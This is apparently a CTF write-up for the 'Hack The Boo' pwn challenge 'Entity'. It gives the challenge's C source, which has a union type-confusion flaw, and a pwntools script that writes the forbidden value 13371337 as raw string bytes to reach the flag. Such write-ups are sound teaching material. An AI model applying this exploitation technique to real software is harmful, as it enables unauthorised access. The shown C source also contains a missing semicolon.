---
title: Hack The Boo pwn.Entity 2022
author: megachar0x01
date: 2022-10-28
categories: [Pwn, amd64, ctf]
---

### Purpose : Get The Flag


<img src="https://i.imgur.com/Aap5bVg.png" alt="img_1">

## Challenge
```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static union {
    unsigned long long integer;
    char string[8];
} DataStore;

typedef enum {
    STORE_GET,
    STORE_SET,
    FLAG
} action_t;

typedef enum {
    INTEGER,
    STRING
} field_t;

typedef struct { 
    action_t act;
    field_t field;
} menu_t;

menu_t menu() {
    menu_t res = { 0 };
    char buf[32] = { 0 };
    printf("\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    switch (buf[0]) {
    case 'T':
        res.act = STORE_SET;
        break;
    case 'R':
        res.act = STORE_GET;
        break;
    case 'C':
        res.act = FLAG;
        return res;
    default:
        puts("\nWhat's this nonsense?!");
        exit(-1);
    }

    printf("\nThis does not seem to work.. (L)ie down or (S)cream\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    switch (buf[0]) {
    case 'L':
        res.field = INTEGER;
        break;
    case 'S':
        res.field = STRING;
        break;
    default:
        printf("\nYou are doomed!\n");
        exit(-1);
    }
    return res;
}

void set_field(field_t f) {
    char buf[32] = {0};
    printf("\nMaybe try a ritual?\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    switch (f) {
    case INTEGER:
        sscanf(buf, "%llu", &DataStore.integer);
        if (DataStore.integer == 13371337) {
            puts("\nWhat's this nonsense?!");
            exit(-1);
        }
        break;
    case STRING:
        memcpy(DataStore.string, buf, sizeof(DataStore.string));
        break;
    }

}

void get_field(field_t f) {
    printf("\nAnything else to try?\n\n>> ");
    switch (f) {
    case INTEGER:
        printf("%llu\n", DataStore.integer);
        break;
    case STRING:
        printf("%.8s\n", DataStore.string);
        break;
    }
}

void get_flag() {
    if (DataStore.integer == 13371337) {
        system("cat flag.txt");
        exit(0);
    } else {
        puts("\nSorry, this will not work!");
    }
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    bzero(&DataStore, sizeof(DataStore));
    printf("\nSomething strange is coming out of the TV..\n");
    while (1) {
        menu_t result = menu();
        switch (result.act) {
        case STORE_SET:
            set_field(result.field);
            break
        case STORE_GET:
            get_field(result.field);
            break;
        case FLAG:
            get_flag();
            break;
        }
    }

}


```

## Solution


```python

#!/usr/bin/python3
from pwn import *
import struct

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
break *get_flag+11
continue
'''.format(**locals())

exe = './entity'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)

io = start()

io.sendlineafter(b">>",b"T")
io.sendlineafter(b">>",b"S")
io.sendlineafter(b">>",p64(0xcc07c9))
io.sendlineafter(b">>",b"C")

print(io.recvline())

io.close()

```
